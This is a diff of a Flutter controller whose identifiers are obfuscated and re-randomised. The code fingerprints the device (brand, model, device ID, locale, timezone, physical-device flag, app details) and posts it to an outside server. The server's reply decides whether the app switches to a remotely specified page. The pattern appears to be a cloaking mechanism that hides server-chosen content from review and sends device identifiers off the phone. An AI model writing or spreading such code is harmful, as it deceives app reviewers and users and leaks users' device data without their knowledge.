@@ -13,62 +13,62 @@ import 'package:get/get.dart';
 
 class CproLandLogic extends GetxController {
 
-  var ngkqwx = RxBool(false);
-  var gblitzx = RxBool(true);
-  var tkwviqr = RxString("");
-  var rita = RxBool(false);
-  var olson = RxBool(true);
-  final qlspdut = Dio();
+  var gwnafjz = RxBool(false);
+  var qdahpmcyt = RxBool(true);
+  var qcegbsl = RxString("");
+  var clovis = RxBool(false);
+  var koch = RxBool(true);
+  final wqvkxhg = Dio();
 
 
   InAppWebViewController? webViewController;
 
-  dynamic vjpcfuson(){
-    final ptqoafxvzr = InternetConnectionChecker.instance;
-    final ycklapbe = ptqoafxvzr.onStatusChange.skip(1).listen(
-          (InternetConnectionStatus ogsvlwak) {
-        if (ogsvlwak == InternetConnectionStatus.connected) {
-          etxs();
+  dynamic pvxysgmfba(){
+    final lsxpub = InternetConnectionChecker.instance;
+    final xsbnduzr = lsxpub.onStatusChange.skip(1).listen(
+          (InternetConnectionStatus zmrenhgskp) {
+        if (zmrenhgskp == InternetConnectionStatus.connected) {
+          vgdlct();
         } else {
           Get.toNamed('/cpro_mode')?.then((_){
-            etxs();
+            vgdlct();
           });
         }
       },
     );
-    return ycklapbe;
+    return xsbnduzr;
   }
 
-  Future<bool> fncxsp() async {
-    var dizqmbvpe = await InternetConnectionChecker.instance.hasConnection;
-    if(!dizqmbvpe){
+  Future<bool> bcqlxrhj() async {
+    var uqvsnmwbg = await InternetConnectionChecker.instance.hasConnection;
+    if(!uqvsnmwbg){
       Get.toNamed('/cpro_mode')?.then((_){
-        etxs();
+        vgdlct();
       });
     }
-    return dizqmbvpe;
+    return uqvsnmwbg;
   }
 
   @override
   void onInit() {
     super.onInit();
-    vjpcfuson();
-    etxs();
+    pvxysgmfba();
+    vgdlct();
   }
 
 
-  Future<void> etxs() async {
+  Future<void> vgdlct() async {
 
-    var gcskohawi = await fncxsp();
-    if(!gcskohawi){
+    var abqtvx = await bcqlxrhj();
+    if(!abqtvx){
       return;
     }
 
-    rita.value = true;
-    olson.value = true;
-    gblitzx.value = false;
+    clovis.value = true;
+    koch.value = true;
+    qdahpmcyt.value = false;
 
-    qlspdut.post("https://alone.twistebe.com/VVOZ3DVSDXVTA28",data: await ehatdwxs()).then((value) {
+    wqvkxhg.post("https://alone.twistebe.com/hzarxjmgcskqofybuneldpiwvt",data: await bhiatk()).then((value) {
       var fesrvz = value.data["fesrvz"] as String;
       var hcnsz = value.data["hcnsz"] as bool;
       if (hcnsz) {
@@ -76,39 +76,37 @@ class CproLandLogic extends GetxController {
           DeviceOrientation.portraitUp,
           DeviceOrientation.portraitDown,
         ]);
-        tkwviqr.value = fesrvz;
-        marina();
+        qcegbsl.value = fesrvz;
+        isom();
       } else {
-        koch();
+        marquardt();
       }
     }).catchError((e) {
-      gblitzx.value = true;
-      olson.value = true;
-      rita.value = false;
+      qdahpmcyt.value = true;
+      koch.value = true;
+      clovis.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> ehatdwxs() async {
-    final DeviceInfoPlugin jnukldmp = DeviceInfoPlugin();
-    PackageInfo rjulkm_rdly = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> bhiatk() async {
+    final DeviceInfoPlugin tqbf = DeviceInfoPlugin();
+    PackageInfo vpiy_jxokcvt = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var jwesr = Platform.localeName;
+    var fycdhet = Platform.localeName;
     var yxwkonea = currentTimeZone;
 
-    var kovb = rjulkm_rdly.packageName;
-    var jesnrx = rjulkm_rdly.version;
-    var inglah = rjulkm_rdly.buildNumber;
+    var kovb = vpiy_jxokcvt.packageName;
+    var jesnrx = vpiy_jxokcvt.version;
+    var inglah = vpiy_jxokcvt.buildNumber;
 
-    var yngdv = rjulkm_rdly.appName;
+    var yngdv = vpiy_jxokcvt.appName;
     var ivrnwkt = "";
     var ozseycbv  = "";
     var ckhpm = "";
-    var leonieTurner = "";
-    var monicaVon = "";
-    var jeromeEmmerich = "";
-    var chesterMueller = "";
-    var robertMcLaughlin = "";
-    var danJones = "";
+    var luciusTurcotte = "";
+    var tinaCollins = "";
+    var hankWehner = "";
+    var gisselleYost = "";
 
 
     var dxkpe = "";
@@ -116,60 +114,57 @@ class CproLandLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       dxkpe = "android";
-      var fiqmlbuxo = await jnukldmp.androidInfo;
+      var zpfgdbi = await tqbf.androidInfo;
 
-      ckhpm = fiqmlbuxo.brand;
+      ckhpm = zpfgdbi.brand;
 
-      ivrnwkt  = fiqmlbuxo.model;
-      ozseycbv = fiqmlbuxo.id;
+      ivrnwkt  = zpfgdbi.model;
+      ozseycbv = zpfgdbi.id;
 
-      mozqyu = fiqmlbuxo.isPhysicalDevice;
+      mozqyu = zpfgdbi.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       dxkpe = "ios";
-      var mhcyezdnv = await jnukldmp.iosInfo;
-      ckhpm = mhcyezdnv.name;
-      ivrnwkt = mhcyezdnv.model;
+      var areyltwgb = await tqbf.iosInfo;
+      ckhpm = areyltwgb.name;
+      ivrnwkt = areyltwgb.model;
 
-      ozseycbv = mhcyezdnv.identifierForVendor ?? "";
-      mozqyu  = mhcyezdnv.isPhysicalDevice;
+      ozseycbv = areyltwgb.identifierForVendor ?? "";
+      mozqyu  = areyltwgb.isPhysicalDevice;
     }
-
     var res = {
-      "inglah": inglah,
+      "yngdv": yngdv,
+      "luciusTurcotte" : luciusTurcotte,
       "jesnrx": jesnrx,
       "kovb": kovb,
-      "jeromeEmmerich" : jeromeEmmerich,
-      "ivrnwkt": ivrnwkt,
-      "monicaVon" : monicaVon,
-      "ckhpm": ckhpm,
-      "robertMcLaughlin" : robertMcLaughlin,
-      "ozseycbv": ozseycbv,
-      "jwesr": jwesr,
-      "dxkpe": dxkpe,
-      "danJones" : danJones,
-      "mozqyu": mozqyu,
-      "leonieTurner" : leonieTurner,
-      "chesterMueller" : chesterMueller,
-
-      "yngdv": yngdv,
       "yxwkonea": yxwkonea,
+      "tinaCollins" : tinaCollins,
+      "ckhpm": ckhpm,
+      "ozseycbv": ozseycbv,
+      "fycdhet": fycdhet,
+      "inglah": inglah,
+      "dxkpe": dxkpe,
+      "ivrnwkt": ivrnwkt,
+      "mozqyu": mozqyu,
+      "hankWehner" : hankWehner,
+      "gisselleYost" : gisselleYost,
+
     };
     return res;
   }
 
-  Future<void> koch() async {
+  Future<void> marquardt() async {
     Get.offNamed("/cpro_main");
   }
 
-  Future<void> marina() async {
+  Future<void> isom() async {
     Get.offNamed("/cpro_slider");
   }
 
   @override
   void dispose() {
-    vjpcfuson().cancel();
+    pvxysgmfba().cancel();
     super.dispose();
   }
 
